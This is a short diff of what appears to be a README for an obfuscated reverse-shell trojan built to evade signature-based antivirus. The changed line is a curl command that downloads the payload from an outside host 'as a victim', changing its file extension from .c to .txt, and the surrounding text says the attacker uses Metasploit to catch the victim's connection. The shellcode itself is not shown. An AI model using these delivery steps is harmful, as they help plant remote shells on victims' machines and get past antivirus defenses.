@@ -18,7 +18,7 @@ Obfuscated reverse-shell shellcode aimed to bypass signature-based antivirus
       
   To download the trojan as a victim:
     
-      $curl -O http://bigbadcyborg.com/payload-22.c
+      $curl -O http://bigbadcyborg.com/payload-22.txt
       
   Attacker must have Metasploit installed in order to listen for the victim's connection on a port.  
       To download the metasploit installer:
